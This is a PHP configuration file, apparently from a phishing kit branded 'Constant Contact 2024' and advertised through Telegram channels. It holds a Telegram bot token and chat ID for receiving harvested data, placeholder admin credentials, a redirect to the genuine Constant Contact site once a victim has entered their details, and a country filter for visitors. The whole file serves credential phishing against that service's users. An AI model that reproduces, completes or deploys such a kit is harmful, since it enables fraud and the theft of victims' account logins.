<?php 
/********************************************************
 * Group Chat   :   https://t.me/bore3da_chat 
 * Contact me on telegram    :   @Bore3da 
 * Project Name:   Constant Contact 2024
 * Main Author:     Bore3da
 * channel Telegram  :  https://t.me/bore3dashop
********************************************************/

error_reporting(0);
$bot_token = "7336006335:AAH-Tc4THAuDSAUPy47XVsDiHFBx06qSwTQ"; // token
$chat_ids = "-4552726149"; // chat ID
// $botToken = $bot_token;
// $IdTelegram = [$chat_ids,];


// ADMIN
$username = "0";
$password = "0";


$finish = "https://www.constantcontact.com/";
$DefaultNUM = "***tetetet*";
$DefaultEmail = "*****@****";

$allowed_Countries = ["AU", "MA", "CA","PL"];
$COUNTRy_Checker = "OFF";
// // AUTO PILOT
// $pilot = false;

?>